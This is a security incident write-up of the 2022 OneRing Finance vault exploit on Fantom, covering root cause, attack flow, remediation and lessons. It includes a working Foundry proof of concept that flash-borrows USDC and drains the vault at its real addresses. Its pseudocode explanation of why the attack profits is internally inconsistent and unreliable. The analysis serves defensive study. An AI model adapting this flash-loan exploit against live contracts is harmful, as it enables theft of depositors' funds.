# OneRing Finance — Flash Loan Vault Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2022-03-21 |
| **Protocol** | OneRing Finance |
| **Chain** | Fantom |
| **Loss** | ~$1,450,000 (USDC) |
| **Attacker** | Attacker address unidentified |
| **Vulnerable Contract** | OneRing Vault [0x4e332D616b5bA1eDFd87c899E534D996c336a2FC](https://ftmscan.com/address/0x4e332D616b5bA1eDFd87c899E534D996c336a2FC) |
| **Root Cause** | Share issuance in `depositSafe()` is calculated using `pricePerShare()` based on the current block's `totalAssets` (spot balance), enabling profit through a large deposit followed by immediate withdrawal within the same transaction |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/OneRing_exp.sol) |

---
## 1. Vulnerability Overview

OneRing Finance provides a stablecoin yield optimization vault. When users deposit USDC, the vault mints shares; on withdrawal, it returns USDC based on current vault assets.

The `depositSafe()` function calculates the number of shares to mint as `amount / pricePerShare`, where `pricePerShare` is a spot price derived by dividing the vault's current USDC balance by the total share count. The attacker borrowed 80M USDC via flash loan, deposited it into the vault, and immediately withdrew — exploiting the momentarily inflated vault asset state between deposit and withdrawal.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable OneRingVault (pseudocode)
contract OneRingVault {
    IERC20 public usdc;
    uint256 public totalShares;
    uint256 public totalAssets; // Total USDC in the vault

    // ❌ pricePerShare is calculated based on current (spot) assets
    function pricePerShare() public view returns (uint256) {
        if (totalShares == 0) return 1e6; // initial value
        return totalAssets * 1e6 / totalShares;
    }

    // ❌ shares calculated against flash-loan-inflated totalAssets
    function depositSafe(uint256 amount) external {
        uint256 shares = amount * 1e6 / pricePerShare();
        // ❌ When totalAssets is high due to flash loan → pricePerShare ↑ → shares ↓
        // But on withdrawal, totalAssets is lower → same shares redeem more USDC
        usdc.transferFrom(msg.sender, address(this), amount);
        totalAssets += amount;
        _mint(msg.sender, shares);
    }

    // ❌ Spot price also used on withdrawal
    function withdraw(uint256 shares) external {
        uint256 amount = shares * pricePerShare() / 1e6;
        totalShares -= shares;
        totalAssets -= amount;
        _burn(msg.sender, shares);
        usdc.transfer(msg.sender, amount);
    }
}

// ✅ Correct pattern
contract OneRingVaultFixed {
    // ✅ Apply the same basis for shares received on deposit and assets returned on withdrawal
    // ✅ Flash loan prevention: block deposit/withdrawal within the same block
    mapping(address => uint256) public lastDepositBlock;

    function withdraw(uint256 shares) external {
        require(lastDepositBlock[msg.sender] < block.number, "same block deposit/withdraw");
        // ...
    }
}
```


### On-Chain Source Code

Source: Source unverified

> ⚠️ No on-chain source code — only bytecode exists or source is unverified

**Vulnerable function** — `depositSafe()`:
```solidity
// ❌ Root cause: Share issuance in `depositSafe()` is calculated using `pricePerShare()` based on the current block's `totalAssets` (spot balance), enabling profit through a large deposit followed by immediate withdrawal within the same transaction
// Source code unverified — bytecode analysis required
// Vulnerability: Share issuance in `depositSafe()` is calculated using `pricePerShare()` based on the current block's `totalAssets` (spot balance), enabling profit through a large deposit followed by immediate withdrawal within the same transaction
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker Contract
    │
    ├─[1] Uniswap V2 flash swap: borrow 80,000,000 USDC
    │       pair.swap(80_000_000 * 1e6, 0, address(this), "0x")
    │
    ├─[2] [Inside flash loan callback]
    │       │
    │       ├─[3] USDC.approve(vault, 80M)
    │       │
    │       ├─[4] vault.depositSafe(80_000_000 * 1e6)
    │       │       Vault USDC assets = existing + 80M
    │       │       pricePerShare = (existing assets + 80M) / totalShares
    │       │       → pricePerShare spikes sharply
    │       │       Minted shares = 80M / inflated pricePerShare
    │       │                     = far fewer shares than normal
    │       │
    │       ├─[5] vault.withdraw(all held shares)
    │       │       Returned USDC = shares × current pricePerShare
    │       │       ⚡ pricePerShare still high immediately after deposit
    │       │       → deposit 80M and receive more USDC back
    │       │
    │       └─[6] Repay flash loan
    │
    └─[7] Net profit: ~$1,450,000
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IOneRingVault {
    function depositSafe(uint256 amount) external;
    function withdraw(uint256 shares) external;
}

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract ContractTest is Test {
    IUniswapV2Pair pair =
        IUniswapV2Pair(0xbcab7d083Cf6a01e0DdA9ed7F8a02b47d125e682);
    IERC20 USDC         = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);
    IOneRingVault vault = IOneRingVault(0x4e332D616b5bA1eDFd87c899E534D996c336a2FC);

    function setUp() public {
        vm.createSelectFork("fantom", 34_041_499);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Before] USDC balance", USDC.balanceOf(address(this)), 6);

        // [Step 1] Borrow 80M USDC via flash swap
        pair.swap(80_000_000 * 1e6, 0, address(this), "0x");

        emit log_named_decimal_uint("[After] USDC profit", USDC.balanceOf(address(this)), 6);
    }

    // Uniswap flash loan callback
    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        // [Step 2] approve
        USDC.approve(address(vault), type(uint256).max);

        // [Step 3] Deposit 80M USDC into vault → pricePerShare spikes
        vault.depositSafe(amount0);

        // [Step 4] Immediately withdraw everything → receive more USDC at the manipulated high pricePerShare
        // IERC20(vault).balanceOf = held vault share count
        vault.withdraw(IERC20(address(vault)).balanceOf(address(this)));

        // [Step 5] Repay flash loan (0.01% fee)
        uint256 repay = (amount0 / 9999 * 10_000) + 10_000;
        USDC.transfer(address(pair), repay);

        // [Step 6] Transfer remaining profit
        USDC.transfer(tx.origin, USDC.balanceOf(address(this)));
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Vault share price dependence on spot balance — `pricePerShare()` is calculated based on the current block balance and can be manipulated within a single transaction |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **OWASP DeFi** | Spot-balance-based share issuance (price lacking manipulation resistance) |
| **Attack Vector** | `depositSafe()` → spot price spike → immediate `withdraw()` (single transaction) |
| **Precondition** | `pricePerShare()` directly uses the current block's `totalAssets` |
| **Impact** | Gradual draining of all vault assets |

---
## 6. Remediation Recommendations

1. **Block same-block deposit/withdrawal**: Require at least 1 block to pass after a deposit before withdrawal is permitted.
2. **TWAP-based pricing**: Use a time-weighted average price for share price calculation to resist short-term manipulation.
3. **Deposit/withdrawal fees**: Apply high fees to deposit-withdrawal cycles within the same transaction to eliminate economic incentive.
4. **Flash loan detection**: Enforce `tx.origin == msg.sender` checks or set limits on balance fluctuation.

---
## 7. Lessons Learned

- **Harvest Finance pattern repeated**: Even after Harvest Finance in 2020, the same spot-balance-based share price vulnerability recurred. The flash loan is merely a financing vehicle to exploit this vulnerability; the root cause is the design flaw of `pricePerShare()` using the current block balance directly.
- **Fundamental vault design issue**: In yield optimization vaults, calculating share price from spot balance means profit is achievable through deposit-withdrawal alone within a single transaction. An attacker with sufficient capital — even without a flash loan — can execute the same attack.
- **$1.45M loss**: The same attack pattern has been repeated across multiple small protocols in the Fantom ecosystem.